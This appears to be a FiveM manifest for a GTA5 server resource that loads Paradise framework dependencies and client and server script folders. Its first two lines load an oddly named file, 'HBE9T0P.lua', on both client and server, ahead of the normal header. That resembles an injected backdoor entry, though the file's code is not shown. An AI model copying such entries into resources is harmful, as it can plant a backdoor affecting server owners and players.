server_script "HBE9T0P.lua"
client_script "HBE9T0P.lua"
fx_version("cerulean")
games({ "gta5" })
lua54("yes")
client_script("@Paradise-base/components/cl_error.lua")
client_script("@Paradise-pwnzor/client/check.lua")

client_scripts({
	"client/*.lua",
})

server_scripts({
	"server/*.lua",
})
